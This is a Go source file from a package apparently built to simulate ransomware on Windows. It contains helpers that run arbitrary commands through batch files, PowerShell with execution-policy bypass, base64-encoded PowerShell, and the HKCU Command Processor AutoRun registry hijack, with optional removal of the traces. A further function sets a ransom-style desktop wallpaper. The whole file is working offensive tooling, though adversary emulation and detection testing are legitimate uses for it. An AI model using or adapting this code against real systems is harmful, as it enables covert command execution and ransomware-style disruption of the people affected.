//go:build windows

package ransimware

import (
	"encoding/base64"
	"encoding/binary"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/mjwhitta/errors"
)

func executeBat(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var b []byte
	var e error

	// Create bat script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	// Run bat script
	b, e = exec.Command(name).Output()

	// Clean up, if requested
	if clean {
		_ = os.Remove(name)
	}

	// Check for error
	if e != nil {
		return "", errors.Newf("command \"%s\" failed: %w", name, e)
	}

	return strings.TrimSpace(string(b)), nil
}

func executePS1(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var b []byte
	var e error

	// Create ps1 script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	// Allow unsigned scripts to run
	_, e = executeShell(
		"powershell",
		[]string{"Set-ExecutionPolicy -Scope Process Bypass"},
	)
	if e != nil {
		return "", e
	}

	// Run ps1 script
	b, e = exec.Command("powershell", "-File", name).Output()

	// Clean up, if requested
	if clean {
		_ = os.Remove(name)
	}

	// Check for error
	if e != nil {
		return "", errors.Newf("command \"%s\" failed: %w", name, e)
	}

	return strings.TrimSpace(string(b)), nil
}

func executeRegistry(cmds []string, clean bool) (string, error) {
	var b []byte
	var e error
	var found bool
	var k registry.Key
	var old string
	var out []string

	// Create key
	k, found, e = registry.CreateKey(
		registry.CURRENT_USER,
		filepath.Join("Software", "Microsoft", "Command Processor"),
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if e != nil {
		return "", errors.Newf("failed to create key: %w", e)
	}

	// Get old value
	if found {
		if old, _, _ = k.GetStringValue("AutoRun"); old != "" {
			defer func() {
				// Restore old value
				_ = k.SetStringValue("AutoRun", old)
			}()
		}
	}

	for _, cmd := range cmds {
		// Set new value
		if e = k.SetStringValue("AutoRun", cmd); e != nil {
			e = errors.Newf("failed to set AutoRun value: %w", e)
			return "", e
		}

		// Run cmd
		b, e = exec.Command("cmd", "/C", "echo off").Output()
		if e != nil {
			return strings.Join(out, "\n"), e
		}

		out = append(out, strings.TrimSpace(string(b)))
	}

	if !clean {
		return strings.Join(out, "\n"), nil
	}

	// Clean up if requested
	if !found {
		// Delete key if not found
		e = registry.DeleteKey(
			registry.CURRENT_USER,
			filepath.Join(
				"Software",
				"Microsoft",
				"Command Processor",
			),
		)
		if e != nil {
			return strings.Join(out, "\n"), e
		}
	} else {
		// Delete new value if no old value
		if e = k.DeleteValue("AutoRun"); e != nil {
			return strings.Join(out, "\n"), e
		}
	}

	return strings.Join(out, "\n"), nil
}

// ExecuteScript will run shell commands using the provided method, as
// well as attempt to clean up artifacts, if requested. Supported
// methods include:
//   - b64powershell (takes commands)
//   - bat (will write and run script, takes name and commands)
//   - cmd (takes commands)
//   - encpowershell (same as b64powershell)
//   - encpsh (same as b64powershell)
//   - powershell (takes commands)
//   - ps1 (will write and run script, takes name and commands)
//   - psh (same as powershell)
//   - reg (same as registry)
//   - registry (will write registry keys, takes commands)
//   - shell (same as cmd)
func ExecuteScript(
	method string,
	clean bool,
	cmds ...string,
) (string, error) {
	if len(cmds) == 0 {
		return "", nil
	}

	switch method {
	case "b64powershell", "encpowershell", "encpsh":
		return executeShell("encpowershell", cmds)
	case "bat":
		return executeBat(cmds[0], cmds[1:], clean)
	case "cmd", "shell":
		return executeShell("cmd", cmds)
	case "powershell", "psh":
		return executeShell("powershell", cmds)
	case "ps1":
		return executePS1(cmds[0], cmds[1:], clean)
	case "reg", "registry":
		return executeRegistry(cmds, clean)
	default:
		return "", errors.Newf("unsupported method: %s", method)
	}
}

func executeShell(shell string, cmds []string) (string, error) {
	var b []byte
	var b64 string
	var e error
	var flag string
	var oneline strings.Builder
	var out []string
	var utf8 []byte
	var utf16 []uint16

	switch shell {
	case "encpowershell", "powershell":
		for _, cmd := range cmds {
			cmd = strings.TrimSpace(cmd)
			oneline.WriteString(cmd)

			if !strings.HasSuffix(cmd, "{") &&
				!strings.HasSuffix(cmd, ";") {
				oneline.WriteString(";")
			}
		}
	}

	switch shell {
	case "cmd":
		flag = "/C"
	case "encpowershell":
		utf16, e = windows.UTF16FromString(oneline.String())
		if e != nil {
			e = errors.Newf(
				"failed to convert %s to Windows type: %w",
				oneline.String(),
				e,
			)

			return "", e
		}

		//nolint:mnd // utf16 = utf8 * 2
		utf8 = make([]byte, 2*len(utf16)-2)
		for i, b16 := range utf16[:len(utf16)-1] {
			binary.LittleEndian.PutUint16(utf8[2*i:2*(i+1)], b16)
		}

		b64 = base64.StdEncoding.EncodeToString(utf8)
		cmds = []string{b64}
		flag = "-e"
		shell = "powershell"
	case "powershell":
		cmds = []string{oneline.String()}
		flag = "-c"
	default:
		return "", errors.Newf("unsupported shell: %s", shell)
	}

	// Run cmds
	for _, cmd := range cmds {
		//nolint:gosec // G204 - That's the whole point
		if b, e = exec.Command(shell, flag, cmd).Output(); e != nil {
			e = errors.Newf("command \"%s\" failed: %w", cmd, e)
			return strings.Join(out, "\n"), e
		}

		if len(b) > 0 {
			out = append(out, strings.TrimSpace(string(b)))
		}
	}

	return strings.Join(out, "\n"), nil
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(
	img string,
	png []byte,
	fit string,
	clean bool,
) NotifyFunc {
	return func() error {
		var e error
		var k registry.Key
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		if img, e = filepath.Abs(img); e != nil {
			return errors.Newf(
				"failed to find absolute path for wallpaper: %w",
				e,
			)
		}

		// Write PNG to file
		//nolint:mnd // u=rw,go=-
		e = os.WriteFile(filepath.Clean(img), png, 0o600)
		if e != nil {
			return errors.Newf("failed to write to %s: %w", img, e)
		}

		// Get key
		k, _, e = registry.CreateKey(
			registry.CURRENT_USER,
			filepath.Join("Control Panel", "Desktop"),
			registry.SET_VALUE,
		)
		if e != nil {
			return errors.Newf("failed to get registry key: %w", e)
		}

		// Set wallpaper
		if e = k.SetStringValue("WallPaper", img); e != nil {
			return errors.Newf("failed to set wallpaper key: %w", e)
		}

		// Set style
		if e = k.SetStringValue("WallpaperStyle", fit); e != nil {
			return errors.Newf("failed to set style key: %w", e)
		}

		// Set tiling
		switch fit {
		case DesktopTile:
			e = k.SetStringValue("TileWallpaper", "1")
		default:
			e = k.SetStringValue("TileWallpaper", "0")
		}

		if e != nil {
			return errors.Newf("failed to set tile key: %w", e)
		}

		// Change background with Windows API, or try
		user32 = windows.NewLazySystemDLL("User32")

		//nolint:gosec // G103 - Windows kinda needs unsafe
		_, _, _ = user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(img)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file, if requested
		if clean {
			_ = os.Remove(img)
		}

		return nil
	}
}

func writeScript(name string, cmds []string) (e error) {
	var f *os.File

	// Open script
	if f, e = os.Create(filepath.Clean(name)); e != nil {
		return errors.Newf("failed to create %s: %w", name, e)
	}
	defer func() {
		if e == nil {
			e = f.Close()
		}
	}()

	// Write script
	for _, cmd := range cmds {
		if _, e = f.WriteString(cmd + "\n"); e != nil {
			return errors.Newf("failed to write to %s: %w", name, e)
		}
	}

	return nil
}
